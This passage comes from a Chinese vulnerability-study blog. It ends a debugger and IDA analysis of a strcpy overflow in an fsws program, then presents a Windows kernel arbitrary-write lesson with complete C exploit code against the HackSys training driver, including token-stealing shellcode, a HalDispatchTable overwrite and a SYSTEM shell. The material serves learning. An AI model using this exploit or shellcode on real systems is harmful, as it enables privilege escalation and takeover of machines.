class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000d edx=012f46b0 esi=012f46c8 edi=01ba6e48</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000c edx=012f46b0 esi=012f46cc edi=01ba6e4c</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000b edx=012f46b0 esi=012f46d0 edi=01ba6e50</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000a edx=012f46b0 esi=012f46d4 edi=01ba6e54</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000009 edx=012f46b0 esi=012f46d8 edi=01ba6e58</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000008 edx=012f46b0 esi=012f46dc edi=01ba6e5c</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000007 edx=012f46b0 esi=012f46e0 edi=01ba6e60</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000006 edx=012f46b0 esi=012f46e4 edi=01ba6e64</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000005 edx=012f46b0 esi=012f46e8 edi=01ba6e68</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000004 edx=012f46b0 esi=012f46ec edi=01ba6e6c</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000003 edx=012f46b0 esi=012f46f0 edi=01ba6e70</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000002 edx=012f46b0 esi=012f46f4 edi=01ba6e74</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000001 edx=012f46b0 esi=012f46f8 edi=01ba6e78</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">eax=0000004e ebx=00000000 ecx=00000000 edx=012f46b0 esi=012f46fc edi=01ba6e7c</div><div class="line">eip=00412cc9 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203</div><div class="line">fsws+0x12cc9:</div><div class="line">00412cc9 8bc8            mov     ecx,eax</div><div class="line">0:004&gt; dc edi-50</div><div class="line">01ba6e2c  7c839ac0 73736150 413d4457 41414141  ...|PassWD=AAAAA</div><div class="line">01ba6e3c  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">01ba6e4c  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">01ba6e5c  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">01ba6e6c  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">01ba6e7c  0042b2ec 012f46b0 012f4740 011347a0  ..B..F/.@G/..G..</div><div class="line">01ba6e8c  00000000 01ba7624 0012b9d0 01ba7240  ....$v......@r..</div><div class="line">01ba6e9c  00000200 012f8fac 0093003d 01133bd8  ....../.=....;..</div></pre></td></tr></table></figure></p>
<p>上面是数据拷贝，并且esi就是开头的参数,012f46b0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">......省略</div><div class="line">0:004&gt; dd esp</div><div class="line">01ba6e7c  0042b2ec 012f46b0 012f4740 011345c0</div><div class="line">01ba6e8c  00000000 01ba7624 0012b9d0 01ba7240</div><div class="line">01ba6e9c  00000200 012f8fac 0093003d 01133bd8</div><div class="line">01ba6eac  011345c0 0131b05c 00000000 01134520</div><div class="line">01ba6ebc  0019a8e8 005a38e8 005a38e8 01ba6e88</div><div class="line">01ba6ecc  01ba6eb0 0012b9d0 01ba6e80 01ba6e84</div><div class="line">01ba6edc  003eaf18 015a12c0 ffffff00 01134480</div><div class="line">01ba6eec  005a38e8 003e0000 01133bd8 003eaf00</div><div class="line">......省略</div></pre></td></tr></table></figure></p>
<p>可以观察下ida伪代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">int __thiscall sub_412A50(void *this, int a2, unsigned __int8 *a3, char a4, char a5)</div><div class="line">&#123;</div><div class="line">  _DWORD *v5; // edi@1</div><div class="line">  int v6; // esi@1</div><div class="line">  signed int v7; // eax@5</div><div class="line">  int v8; // eax@6</div><div class="line">  void *v9; // eax@8</div><div class="line">  CHAR *v10; // eax@10</div><div class="line">  int v11; // esi@13</div><div class="line">  void *v12; // eax@15</div><div class="line">  const CHAR *v13; // ecx@16</div><div class="line">  int result; // eax@18</div><div class="line">  CHAR *v15; // eax@25</div><div class="line">  void *v16; // eax@36</div><div class="line">  CHAR *v17; // eax@37</div><div class="line">  const char **v18; // eax@44</div><div class="line">  int v19; // esi@44</div><div class="line">  const char **v20; // eax@46</div><div class="line">  int v21; // esi@46</div><div class="line">  const char **v22; // eax@47</div><div class="line">  int v23; // esi@47</div><div class="line">  const CHAR *v24; // ecx@48</div><div class="line">  int v25; // esi@51</div><div class="line">  int v26; // esi@56</div><div class="line">  int v27; // esi@58</div><div class="line">  int v28; // esi@59</div><div class="line">  int v29; // esi@61</div><div class="line">  ......省略</div><div class="line">LABEL_53:</div><div class="line">      v53 = -1;</div><div class="line">      sub_52D7A7(&amp;a4);</div><div class="line">      return -1;</div><div class="line">    &#125;</div><div class="line">    v10 = sub_498AB0(&amp;v50, aAccess);</div><div class="line">    sub_52D815(v10);</div><div class="line">    LOBYTE(v53) = 8;</div><div class="line">    v47 = 0;</div><div class="line">    sub_498490(&amp;v47, 0);</div><div class="line">    sub_496CC0(&amp;v51);</div><div class="line">    v34 = *(const char **)(v6 + 3444);</div><div class="line">    LOBYTE(v53) = 9;</div><div class="line">    sub_522D43((int)&amp;v35, aSvfolder_user_, (int)v34);</div><div class="line">    if ( (unsigned __int8)sub_4971A0((LPCSTR)v35, 0) )</div><div class="line">    &#123;</div><div class="line">      *(_DWORD *)v40 = strcpy(&amp;v52, (const char *)a2); //这里的a2参数直接传入</div></pre></td></tr></table></figure></p>
<p>内存拷贝时没有做限制，esp+110处的地址被覆盖为0x41414141,最终esi引用了无效地址触发异常。可以看到整个过程非常简单，但是代码量太多了。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[windows内核漏洞学习篇-任意地址写]]></title>
      <url>http://yoursite.com/2017/06/30/windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AF%87-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/</url>
      <content type="html"><![CDATA[<p>任意地址写利用原理主要是覆盖HalDispatchTable + 4位置的值为shellcode的值，where是指向HalDispatchTable + 4的指针，what是指向shellcode的指针。下图比较清楚<br><img src="/img/6.png" alt="image"></p>
<p>下面是漏洞代码，原理挺简单的，看注释就能看懂。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">NTSTATUS TriggerArbitraryOverwrite(IN PWRITE_WHAT_WHERE UserWriteWhatWhere) &#123;</div><div class="line">    PULONG What = NULL;</div><div class="line">    PULONG Where = NULL;</div><div class="line">    NTSTATUS Status = STATUS_SUCCESS;</div><div class="line"></div><div class="line">    PAGED_CODE();</div><div class="line"></div><div class="line">    __try &#123;</div><div class="line">        // Verify if the buffer resides in user mode</div><div class="line">        ProbeForRead((PVOID)UserWriteWhatWhere,</div><div class="line">                     sizeof(WRITE_WHAT_WHERE),</div><div class="line">                     (ULONG)__alignof(WRITE_WHAT_WHERE));</div><div class="line"></div><div class="line">        What = UserWriteWhatWhere-&gt;What;</div><div class="line">        Where = UserWriteWhatWhere-&gt;Where;</div><div class="line"></div><div class="line">        DbgPrint(&quot;[+] UserWriteWhatWhere: 0x%p\n&quot;, UserWriteWhatWhere);</div><div class="line">        DbgPrint(&quot;[+] WRITE_WHAT_WHERE Size: 0x%X\n&quot;, sizeof(WRITE_WHAT_WHERE));</div><div class="line">        DbgPrint(&quot;[+] UserWriteWhatWhere-&gt;What: 0x%p\n&quot;, What);</div><div class="line">        DbgPrint(&quot;[+] UserWriteWhatWhere-&gt;Where: 0x%p\n&quot;, Where);</div><div class="line"></div><div class="line">#ifdef SECURE</div><div class="line">        // Secure Note: This is secure because the developer is properly validating if address</div><div class="line">        // pointed by &apos;Where&apos; and &apos;What&apos; value resides in User mode by calling ProbeForRead()</div><div class="line">        // routine before performing the write operation</div><div class="line">        ProbeForRead((PVOID)Where, sizeof(PULONG), (ULONG)__alignof(PULONG));</div><div class="line">        ProbeForRead((PVOID)What, sizeof(PULONG), (ULONG)__alignof(PULONG));</div><div class="line"></div><div class="line">        *(Where) = *(What);</div><div class="line">#else</div><div class="line">        DbgPrint(&quot;[+] Triggering Arbitrary Overwrite\n&quot;);</div><div class="line"></div><div class="line">        // Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability</div><div class="line">        // because the developer is writing the value pointed by &apos;What&apos; to memory location</div><div class="line">        // pointed by &apos;Where&apos; without properly validating if the values pointed by &apos;Where&apos;</div><div class="line">        // and &apos;What&apos; resides in User mode</div><div class="line">        *(Where) = *(What);</div><div class="line">#endif</div><div class="line">    &#125;</div><div class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</div><div class="line">        Status = GetExceptionCode();</div><div class="line">        DbgPrint(&quot;[-] Exception Code: 0x%X\n&quot;, Status);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return Status;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>exp的代码很长。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#include &quot;stdafx.h&quot;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;Windows.h&gt;</div><div class="line">#include &lt;winioctl.h&gt;</div><div class="line">#include &lt;TlHelp32.h&gt;</div><div class="line"></div><div class="line"></div><div class="line">#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN,0x802,\</div><div class="line">    METHOD_NEITHER, FILE_ANY_ACCESS)</div><div class="line"></div><div class="line">#define KTHREAD_OFFSET  0x124</div><div class="line">#define EPROCESS_OFFSET 0x044</div><div class="line">#define PID_OFFSET        0x084</div><div class="line">#define FLINK_OFFSET    0x088</div><div class="line">#define TOKEN_OFFSET    0x0c8</div><div class="line">#define SYSTEM_PID      0x004</div><div class="line"></div><div class="line">VOID TokenStealingShellcodeWin() &#123;</div><div class="line">    __asm &#123;</div><div class="line">        pushad</div><div class="line"></div><div class="line">        mov eax, fs:[KTHREAD_OFFSET]</div><div class="line">        mov eax, [eax + EPROCESS_OFFSET]</div><div class="line"></div><div class="line">        mov ecx, eax</div><div class="line">        mov ebx, [eax + TOKEN_OFFSET]</div><div class="line">        mov edx, SYSTEM_PID</div><div class="line"></div><div class="line">        SearchSystemPID :</div><div class="line">        mov eax, [eax + FLINK_OFFSET]</div><div class="line">            sub eax, FLINK_OFFSET</div><div class="line">            cmp[eax + PID_OFFSET], edx</div><div class="line">            jne SearchSystemPID</div><div class="line"></div><div class="line">            mov edx, [eax + TOKEN_OFFSET]</div><div class="line">            mov[ecx + TOKEN_OFFSET], edx</div><div class="line"></div><div class="line">            popad</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">typedef struct _WRITE_WHAT_WHERE &#123;</div><div class="line">    PULONG What;</div><div class="line">    PULONG Where;</div><div class="line">&#125;WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;</div><div class="line"></div><div class="line">typedef enum &#123;</div><div class="line">    SystemBasicInformation,</div><div class="line">    SystemProcessorInformation,</div><div class="line">    SystemPerformanceInformation,</div><div class="line">    SystemTimeOfDayInformation,</div><div class="line">    SystemPathInformation,</div><div class="line">    SystemProcessInfomation,</div><div class="line">    SystemCallCountInformation,</div><div class="line">    SystemDeviceInformation,</div><div class="line">    SystemProcessorPerformanceInformation,</div><div class="line">    SystemFlagsInformation,</div><div class="line">    SystemCallTimeInformation,</div><div class="line">    SystemModuleInformation</div><div class="line">&#125;SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;</div><div class="line"></div><div class="line">typedef struct &#123;</div><div class="line">    PVOID Reserved1;</div><div class="line">    PVOID Reserved2;</div><div class="line">    PVOID Base;</div><div class="line">    ULONG ImageSize;</div><div class="line">    ULONG Flags;</div><div class="line">    WORD  Id;</div><div class="line">    WORD  Rank;</div><div class="line">    WORD  w108;</div><div class="line">    WORD  NameOffset;</div><div class="line">    CHAR  imageName[256];</div><div class="line">&#125;SYSTEM_MODULE, *PSYSTEM_MODULE;</div><div class="line"></div><div class="line">typedef struct &#123;</div><div class="line">    ULONG ModulesCount;</div><div class="line">    SYSTEM_MODULE Modules[0];</div><div class="line">&#125;SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;</div><div class="line"></div><div class="line">typedef NTSTATUS(WINAPI *NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS, \</div><div class="line">    OUT PVOID SystemInformation, \</div><div class="line">    IN ULONG  SystemInformationLength,  \</div><div class="line">    OUT PULONG ReturnLength);</div><div class="line"></div><div class="line"></div><div class="line">typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG ProfileSource, \</div><div class="line">    OUT PULONG Interval);</div><div class="line">	</div><div class="line">	</div><div class="line">int _tmain(int argc, _TCHAR* argv[]) &#123;</div><div class="line">    PWRITE_WHAT_WHERE WriteWhatWhere = NULL;</div><div class="line">    PVOID HalDispatchTable = NULL;</div><div class="line">    PVOID HalDispatchTable4 = NULL;</div><div class="line">    HMODULE ntoskrnl = NULL;</div><div class="line">    PVOID kernelBase = NULL;</div><div class="line">    HMODULE ntdll = NULL;</div><div class="line">    //function</div><div class="line">    NtQuerySystemInformation_t NtQuerySystemInformation;</div><div class="line">    //////////////////////////////////////////////////////////////////</div><div class="line">    NTSTATUS Ntstatus = 0xc0000001;</div><div class="line">    SIZE_T ReturnLength;</div><div class="line">    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;</div><div class="line">    PCHAR KernelImage;</div><div class="line">    PVOID KernelBaseAddressInKernelMode;</div><div class="line">    HMODULE hKernelInUserMode = NULL;</div><div class="line">    PVOID EopPayload = &amp;TokenStealingShellcodeWin;</div><div class="line">    //////////////////////////////////////////////////////////////////</div><div class="line">    NtQueryIntervalProfile_t NtQueryIntervalProfile;</div><div class="line">    ULONG Interval = 0;</div><div class="line">    //////////////////////////////////////////////////////////////////</div><div class="line">    DWORD lpBytesReturned;</div><div class="line">    PVOID pMemoryAddress = NULL;</div><div class="line">    PULONG IpInBuffer = NULL;</div><div class="line">    LPCSTR lpDeviceName = (LPCSTR) &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;;</div><div class="line"></div><div class="line">    printf(&quot;Getting the device handle\r\n&quot;);</div><div class="line">    HANDLE hDriver = CreateFileA(lpDeviceName,</div><div class="line">        GENERIC_READ | GENERIC_WRITE,</div><div class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE,</div><div class="line">        NULL,</div><div class="line">        OPEN_EXISTING,</div><div class="line">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</div><div class="line">        NULL);</div><div class="line"></div><div class="line">    if (hDriver == INVALID_HANDLE_VALUE) &#123;</div><div class="line">        printf(&quot;Failed to get device handle : (0x%X\r\n)&quot;, GetLastError());</div><div class="line">        return 1;</div><div class="line">    &#125;</div><div class="line">    printf(&quot;Got the device Handle : 0x%X\r\n&quot;, hDriver);</div><div class="line"></div><div class="line">    WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(), \</div><div class="line">        HEAP_ZERO_MEMORY, \</div><div class="line">        sizeof(WRITE_WHAT_WHERE));</div><div class="line"></div><div class="line">    //Step 3.</div><div class="line">    ntdll = GetModuleHandle(L&quot;ntdll.dll&quot;);</div><div class="line">    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdll, \</div><div class="line">        &quot;NtQuerySystemInformation&quot;);</div><div class="line"></div><div class="line">    Ntstatus = NtQuerySystemInformation(SystemModuleInformation, \</div><div class="line">        NULL, \</div><div class="line">        0, \</div><div class="line">        &amp;ReturnLength);</div><div class="line">    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), \</div><div class="line">        HEAP_ZERO_MEMORY, \</div><div class="line">        ReturnLength);</div><div class="line">    Ntstatus = NtQuerySystemInformation(SystemModuleInformation, \</div><div class="line">        pSystemModuleInformation, \</div><div class="line">        ReturnLength, \</div><div class="line">        &amp;ReturnLength);</div><div class="line"></div><div class="line">    KernelBaseAddressInKernelMode = pSystemModuleInformation-&gt;Modules[0].Base;</div><div class="line">    KernelImage = strrchr((PCHAR)pSystemModuleInformation-&gt;Modules[0].imageName, &apos;\\&apos;) + 1;</div><div class="line"></div><div class="line">    //Step 1 and 2:</div><div class="line">    printf(&quot;KernelImage : %s\n&quot;, KernelImage);</div><div class="line">    hKernelInUserMode = LoadLibraryA(KernelImage);</div><div class="line">    HalDispatchTable = (PVOID)GetProcAddress(hKernelInUserMode, &quot;HalDispatchTable&quot;);</div><div class="line"></div><div class="line">    //Step 4:</div><div class="line">    HalDispatchTable = (PVOID)((ULONG)HalDispatchTable - (ULONG)hKernelInUserMode);</div><div class="line">    HalDispatchTable = (PVOID)((ULONG)HalDispatchTable + (ULONG)KernelBaseAddressInKernelMode);</div><div class="line"></div><div class="line">    HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);</div><div class="line">    FreeLibrary(ntdll);</div><div class="line">    FreeLibrary(hKernelInUserMode);</div><div class="line"></div><div class="line">    //end</div><div class="line">    HalDispatchTable4 = (PVOID)((ULONG)HalDispatchTable + sizeof(PVOID));</div><div class="line">    WriteWhatWhere-&gt;What = (PULONG)&amp;EopPayload;</div><div class="line">    WriteWhatWhere-&gt;Where = (PULONG)HalDispatchTable4;</div><div class="line"></div><div class="line">    printf(&quot;\t[*]Where : 0x%p\n&quot;, WriteWhatWhere-&gt;Where);</div><div class="line">    printf(&quot;\t[*]What  : 0x%p\n&quot;, WriteWhatWhere-&gt;What);</div><div class="line">    printf(&quot;\t[*]Exp   : 0x%p\n&quot;, EopPayload);</div><div class="line"></div><div class="line">    printf(&quot;Send IOCTL request\r\n&quot;);</div><div class="line"></div><div class="line">    DeviceIoControl(hDriver,</div><div class="line">        HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,</div><div class="line">        (LPVOID)WriteWhatWhere,</div><div class="line">        sizeof(WriteWhatWhere),</div><div class="line">        NULL,</div><div class="line">        0,</div><div class="line">        &amp;lpBytesReturned,</div><div class="line">        NULL);</div><div class="line"></div><div class="line">    //triger the memory overwrite</div><div class="line">    ntdll = LoadLibraryA(&quot;ntdll.dll&quot;);</div><div class="line">    NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(ntdll, &quot;NtQueryIntervalProfile&quot;);</div><div class="line">    NtQueryIntervalProfile(0x1337, &amp;Interval);</div><div class="line">    HeapFree(GetProcessHeap(), 0, (LPVOID)WriteWhatWhere);</div><div class="line">    system(&quot;cmd.exe&quot;);</div><div class="line">    